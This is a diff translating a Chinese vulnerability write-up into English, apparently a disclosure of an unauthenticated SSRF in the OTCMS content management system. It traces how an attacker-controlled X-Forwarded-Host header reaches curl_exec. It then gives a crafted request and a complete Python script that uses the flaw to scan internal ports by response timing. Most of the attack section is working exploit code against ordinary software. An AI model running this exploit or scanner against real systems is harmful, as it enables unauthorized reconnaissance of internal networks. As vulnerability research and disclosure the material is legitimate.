@@ -1,8 +1,8 @@
-# OTCMS 在/admin/readDeal.php?mudi=checkHomeHtml处存在未授权的ssrf漏洞
+# Unauthorized SSRF Vulnerability in OTCMS at /admin/readDeal.php?mudi=checkHomeHtml
 
-代码分析:
-首先定位到漏洞的触发点:
-/admin/readDeal.php?mudi=checkHomeHtml,传入$mudi参数触发函数CheckHomeHtml(),且无任何身份验证
+Code Analysis:
+First, locate the vulnerability trigger point:
+/admin/readDeal.php?mudi=checkHomeHtml, passing the $mudi parameter triggers the CheckHomeHtml() function without any authentication
 
 ```
 switch ($mudi){
@@ -34,7 +34,7 @@ switch ($mudi){
 		die('err');
 }
 ```
-进入CheckHomeHtml(),分析代码中两个关键参数$beforeURL和 $homeHtmlStr,
+Enter CheckHomeHtml() and analyze two key parameters $beforeURL and $homeHtmlStr in the code,
 ```
 function CheckHomeHtml(){
 	global $systemArr;
@@ -42,13 +42,13 @@ function CheckHomeHtml(){
 	$webHtml = new WebHtml();
 	$homeHtmlStr = $webHtml->GetCode($beforeURL);
 	if (strpos($homeHtmlStr,'<!-- Html For') !== false){
-		JS::AlertEnd('网站首页是静态页.');
+		JS::AlertEnd('The website homepage is a static page.');
 	}else{
-		JS::AlertEnd('网站首页不是静态页，您静态页名是 '. $systemArr['SYS_htmlHomeName'] .'.\n1、检查前台'. $systemArr['SYS_htmlHomeName'] .'文件是否存在。\n2、首页默认页'. $systemArr['SYS_htmlHomeName'] .'要优先于index.php');
+		JS::AlertEnd('The website homepage is not a static page, your static page name is '. $systemArr['SYS_htmlHomeName'] .'.\n1. Check if the frontend '. $systemArr['SYS_htmlHomeName'] .' file exists.\n2. The default homepage '. $systemArr['SYS_htmlHomeName'] .' should take priority over index.php');
 	}
 }
 ```
-首先分析$beforeURL,跟进GetUrl::CurrDir(1)
+First analyze $beforeURL, follow up with GetUrl::CurrDir(1)
 inc/classGetUrl.php
 ```
 	public static function CurrDir($dirRank=0){
@@ -60,9 +60,9 @@ inc/classGetUrl.php
 
 	}
 ```
-再次跟进self::Curr(),可以看到这里是要返回一个完整的url结构,接下来跟进分析这三个函数self::HttpHead(),self::HttpHost(),self::HttpSelf()
+Follow up with self::Curr() again, you can see that this is to return a complete URL structure, next follow up to analyze these three functions self::HttpHead(), self::HttpHost(), self::HttpSelf()
 ```
-	// 获取当前网址，不含?和参数
+	// Get current URL, excluding ? and parameters
 	public static function Curr(){
 		// $SERVER_PORT = self::Port();
 		// $SER_HOST = $_SERVER['SERVER_NAME'] . $SERVER_PORT;
@@ -70,7 +70,7 @@ inc/classGetUrl.php
 		return self::HttpHead() . $SER_HOST . self::HttpSelf();
 	}
 ```
-分析可知返回的url结构的控制是以http或https和通过HTTP_X_FORWARDED_HOST来设置host,最后获取$_SERVER['PHP_SELF']存在控制的可能性
+Analysis shows that the control of the returned URL structure is based on http or https and setting the host through HTTP_X_FORWARDED_HOST, and finally obtaining $_SERVER['PHP_SELF'] has control possibilities
 ```
 public static function HttpHost(){
 		// return isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
@@ -88,7 +88,7 @@ public static function HttpHost(){
 		return $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
 	}
 
-	// 获取网址协议 http:// 或 https://
+	// Get URL protocol http:// or https://
 	public static function HttpHead($skip=false){
 		global $systemArr;
 		if (empty($systemArr)){ $systemArr = Cache::PhpFile('system'); }
@@ -110,19 +110,19 @@ public static function HttpHost(){
 	}
 
 ```
-分析完$beforeURL接下来分析 $homeHtmlStr参数,跟进 $webHtml->GetCode()
+After analyzing $beforeURL, next analyze the $homeHtmlStr parameter, follow up with $webHtml->GetCode()
 inc/classWebHtml.php
-这里的$judProxy默认为false,可以顺利进入if支线触发ReqUrl::UseAuto()
+Here $judProxy defaults to false, so it can smoothly enter the if branch to trigger ReqUrl::UseAuto()
 ![](vx_images/98623266768636.png)
 
 ```
-	// 获取网页源码（限制读取时间）
-	// URL：网页地址；charset：编码
+	// Get webpage source code (limit read time)
+	// URL: webpage address; charset: encoding
 	function GetCode($URL, $charset='UTF-8'){
 		global $DB,$systemArr;
 
 		if (empty($URL)){
-			$this->mErrStr='网址错误';
+			$this->mErrStr='URL error';
 			return 'False';
 		}
 		
@@ -148,30 +148,30 @@ inc/classWebHtml.php
 		return $retStr;
 	}
 ```
-查看ReqUrl::UseAuto(),可以发现上一部传入了$this->mGetUrlMode来选择进入switch,
+Check ReqUrl::UseAuto(), you can find that $this->mGetUrlMode was passed in the previous step to select entering switch,
 ![](vx_images/159863411040826.png)
-跟踪$getUrlMode,发现将会获取到默值0
+Track $getUrlMode, find that it will get the default value 0
 ![](vx_images/537324740923138.png)
-这时将会进入switch的default,该cms默认会启用curl,所以触发self::UseCurl($method, $url, $charset, $dataArr)
+At this time it will enter the default of switch, this CMS will enable curl by default, so it triggers self::UseCurl($method, $url, $charset, $dataArr)
 inc/classReqUrl.php
 ```
 public static function UseAuto($seMode, $method, $url, $charset='UTF-8', $dataArr=array(), $retMode=''){
 		$retArr = array('res'=>false, 'note'=>'');
 
 		switch ($seMode){
-			case 1:	// Snoopy插件
+			case 1:	// Snoopy plugin
 				$retArr = self::UseSnoopy($method, $url, $charset, $dataArr);
 				break;
 		
-			case 2:	// curl模式
+			case 2:	// curl mode
 				$retArr = self::UseCurl($method, $url, $charset, $dataArr);
 				break;
 		
-			case 3:	// fsockopen模式
+			case 3:	// fsockopen mode
 				$retArr = self::UseFsockopen($method, $url, $charset, $dataArr);
 				break;
 
-			case 4:	// fopen模式
+			case 4:	// fopen mode
 				$retArr = self::UseFopen($method, $url, $charset, $dataArr);
 				break;
 
@@ -204,31 +204,31 @@ public static function UseAuto($seMode, $method, $url, $charset='UTF-8', $dataAr
 		}
 	}
 ```
-跟进UseCurl()方法,分析发现最终会触发curl_exec(),会对传入的url进行请求,导致ssrf
+Follow up with UseCurl() method, analysis finds that it will eventually trigger curl_exec(), which will make a request to the passed URL, causing SSRF
 ```
-	// 获取页面源代码2 curl模式
+	// Get page source code 2 curl mode
 	public static function UseCurl($method, $url, $charset='UTF-8', $dataArr=array(), $run301=true){
 		if (empty($url)){
-			return array('res'=>false, 'note'=>'UseCurl：网址为空');
+			return array('res'=>false, 'note'=>'UseCurl：URL is empty');
 		}
 
 		$ch = curl_init();
 		curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'); 
 		curl_setopt($ch, CURLOPT_URL, $url);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 80);	// 响应时间
-		curl_setopt($ch ,CURLOPT_TIMEOUT, 150);			// 设置超时
-		// 使用的HTTP协议，CURL_HTTP_VERSION_NONE（让curl自己判断），CURL_HTTP_VERSION_1_0（HTTP/1.0），CURL_HTTP_VERSION_1_1（HTTP/1.1）
+		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 80);	// Response time
+		curl_setopt($ch ,CURLOPT_TIMEOUT, 150);			// Set timeout
+		// HTTP protocol used, CURL_HTTP_VERSION_NONE (let curl decide), CURL_HTTP_VERSION_1_0 (HTTP/1.0), CURL_HTTP_VERSION_1_1 (HTTP/1.1)
 		curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
-		// curl_setopt($ch, CURLOPT_MAXREDIRS,20);		// 允许跳转多少次
-		// curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);	// 自动抓取301跳转后的页面
+		// curl_setopt($ch, CURLOPT_MAXREDIRS,20);		// Allow how many redirects
+		// curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);	// Automatically fetch the page after 301 redirect
 		if (substr(strtolower($url),0,8) == 'https://'){
-			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);	// 跳过证书检查  
-			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);		// 从证书中检查SSL加密算法是否存在
+			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);	// Skip certificate check  
+			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);		// Check if SSL encryption algorithm exists in certificate
 		}
 		if (strtoupper($method) == 'POST'){
 			if (is_array($dataArr)){
-				$newData = http_build_query($dataArr);	// 相反函数 parse_str()
+				$newData = http_build_query($dataArr);	// Reverse function parse_str()
 			}else{
 				$newData = $dataArr;
 			}
@@ -237,10 +237,10 @@ public static function UseAuto($seMode, $method, $url, $charset='UTF-8', $dataAr
 		}
 		$data = curl_exec($ch);
 
-		// 检查是否有错误发生
-		if(curl_errno($ch)){ return array('res'=>false, 'note'=>'UseCurl：发生错误（'. curl_error($ch) .'）'); }
+		// Check if an error occurred
+		if(curl_errno($ch)){ return array('res'=>false, 'note'=>'UseCurl：Error occurred（'. curl_error($ch) .'）'); }
 
-		// 检查HTML返回状态
+		// Check HTML return status
 		$headArr = curl_getinfo($ch);
 
 		curl_close($ch);
@@ -248,9 +248,9 @@ public static function UseAuto($seMode, $method, $url, $charset='UTF-8', $dataAr
 		if ($run301 && in_array($headArr['http_code'],array(301,302))){
 			return self::UseCurl($method, $headArr['redirect_url'], $charset, $dataArr, false);
 		}
-		// if($headArr['http_code'] != 200){ return array('res'=>false, 'note'=>'UseCurl：返回状态'. $headArr['http_code']); }
+		// if($headArr['http_code'] != 200){ return array('res'=>false, 'note'=>'UseCurl：Return status'. $headArr['http_code']); }
 
-		if (strlen($data) == 0){ return array('res'=>false, 'note'=>'UseCurl：获取内容为空'); }
+		if (strlen($data) == 0){ return array('res'=>false, 'note'=>'UseCurl：Retrieved content is empty'); }
 
 		$siteCharset = strtoupper(OT_Charset);
 		if ($siteCharset=='GB2312'){ $siteCharset='GBK'; }
@@ -261,8 +261,8 @@ public static function UseAuto($seMode, $method, $url, $charset='UTF-8', $dataAr
 	}
 ```
 
-这里在本地进行复现
-构造请求包:
+Reproduce locally
+Construct request packet:
 ```
 GET /admin/readDeal.php?mudi=checkHomeHtml HTTP/1.1
 Host: otcms
@@ -279,14 +279,14 @@ Connection: keep-alive
 ![](vx_images/462187191857647.png)
 ![](vx_images/558676187818432.png)
 
-在本地模拟判断内网信息
-在win11上开启python的多个web服务
+Simulate internal network information detection locally
+Start multiple Python web services on Win11
 python -m http.server 4455 --bind 127.0.0.1
 python -m http.server 5566 --bind 127.0.0.1
 python -m http.server 6677 --bind 127.0.0.1
 python -m http.server 7788 --bind 127.0.0.1
 
-使用脚本根据返回时间判断内网的http服务端口的开启情况
+Use script to judge the opening status of internal network HTTP service ports based on return time
 ```
 #!/usr/bin/env python3
 
@@ -298,7 +298,7 @@ import re
 
 
 def scan_port_with_requests(target_ip, port, timeout=4):
-    """使用requests扫描端口"""
+    """Scan ports using requests"""
     headers = {'X-Forwarded-Host': f'{target_ip}:{port}'}
 
     try:
@@ -321,23 +321,23 @@ def scan_port_with_requests(target_ip, port, timeout=4):
 
 
 def parse_ports(port_arg):
-    """解析端口参数，支持单端口、端口范围、端口列表"""
+    """Parse port parameters, supports single port, port range, port list"""
     ports = []
     
-    # 如果是端口范围格式 (如 80-100)
+    # If it's port range format (e.g., 80-100)
     if '-' in port_arg:
         try:
             start, end = map(int, port_arg.split('-'))
             if start <= end and 1 <= start <= 65535 and 1 <= end <= 65535:
                 ports = list(range(start, end + 1))
             else:
-                print(f"❌ 端口范围无效: {port_arg}")
+                print(f"❌ Invalid port range: {port_arg}")
                 return None
         except ValueError:
-            print(f"❌ 端口范围格式错误: {port_arg}")
+            print(f"❌ Port range format error: {port_arg}")
             return None
     
-    # 如果是端口列表格式 (如 22,80,443)
+    # If it's port list format (e.g., 22,80,443)
     elif ',' in port_arg:
         try:
             port_list = port_arg.split(',')
@@ -346,39 +346,39 @@ def parse_ports(port_arg):
                 if 1 <= port <= 65535:
                     ports.append(port)
                 else:
-                    print(f"❌ 端口号超出范围 (1-65535): {port}")
+                    print(f"❌ Port number out of range (1-65535): {port}")
                     return None
         except ValueError:
-            print(f"❌ 端口列表格式错误: {port_arg}")
+            print(f"❌ Port list format error: {port_arg}")
             return None
     
-    # 单个端口
+    # Single port
     else:
         try:
             port = int(port_arg)
             if 1 <= port <= 65535:
                 ports = [port]
             else:
-                print(f"❌ 端口号超出范围 (1-65535): {port}")
+                print(f"❌ Port number out of range (1-65535): {port}")
                 return None
         except ValueError:
-            print(f"❌ 端口格式错误: {port_arg}")
+            print(f"❌ Port format error: {port_arg}")
             return None
     
-    return sorted(list(set(ports)))  # 去重并排序
+    return sorted(list(set(ports)))  # Deduplicate and sort
 
 
 def fast_scan(target_ip, ports=None, timeout=4, threads=50):
-    """快速扫描端口列表"""
+    """Fast scan port list"""
     if ports is None:
-        # 默认扫描常用端口
+        # Default scan common ports
         ports = [
             21, 22, 23, 25, 53, 80, 443, 445, 8080, 8443,
             3306, 3389, 5900, 6379, 27017, 5432
         ]
-        print(f"⚡ 正在扫描 {target_ip} 的常用端口...")
+        print(f"⚡ Scanning common ports of {target_ip}...")
     else:
-        print(f"⚡ 正在扫描 {target_ip}...")
+        print(f"⚡ Scanning {target_ip}...")
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         futures = []
@@ -395,40 +395,40 @@ def fast_scan(target_ip, ports=None, timeout=4, threads=50):
                 print(f"✅ {port}: {rt}ms")
 
 
-# 命令行接口
+# Command line interface
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("使用方法:")
-        print("  python ssrf.py <目标IP>                    # 扫描常用端口")
-        print("  python ssrf.py <目标IP> <端口号>          # 扫描单个端口")
-        print("  python ssrf.py <目标IP> <起始端口>-<结束端口>  # 扫描端口范围")
-        print("  python ssrf.py <目标IP> <端口1>,<端口2>,...   # 扫描多个指定端口")
+        print("Usage:")
+        print("  python ssrf.py <Target IP>                    # Scan common ports")
+        print("  python ssrf.py <Target IP> <Port number>          # Scan single port")
+        print("  python ssrf.py <Target IP> <Start port>-<End port>  # Scan port range")
+        print("  python ssrf.py <Target IP> <Port1>,<Port2>,...   # Scan multiple specified ports")
         print()
-        print("示例:")
-        print("  python ssrf.py 192.168.1.1              # 扫描常用端口")
-        print("  python ssrf.py 192.168.1.1 80           # 扫描80端口")
-        print("  python ssrf.py 192.168.1.1 80-100       # 扫描80到100端口")
-        print("  python ssrf.py 192.168.1.1 22,80,443    # 扫描22,80,443端口")
+        print("Examples:")
+        print("  python ssrf.py 192.168.1.1              # Scan common ports")
+        print("  python ssrf.py 192.168.1.1 80           # Scan port 80")
+        print("  python ssrf.py 192.168.1.1 80-100       # Scan ports 80 to 100")
+        print("  python ssrf.py 192.168.1.1 22,80,443    # Scan ports 22,80,443")
         sys.exit(1)
     
     ip = sys.argv[1]
     
-    # 验证IP地址格式
+    # Verify IP address format
     ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
     if not re.match(ip_pattern, ip):
-        print(f"❌ IP地址格式无效: {ip}")
+        print(f"❌ Invalid IP address format: {ip}")
         sys.exit(1)
     
-    # 解析端口参数
+    # Parse port parameters
     if len(sys.argv) > 2:
         port_arg = sys.argv[2]
         ports = parse_ports(port_arg)
         if ports is None:
             sys.exit(1)
     else:
-        ports = None  # 使用默认常用端口
+        ports = None  # Use default common ports
     
-    # 开始扫描
+    # Start scanning
     fast_scan(ip, ports=ports)
 ```
 ![](vx_images/480082735964291.png)
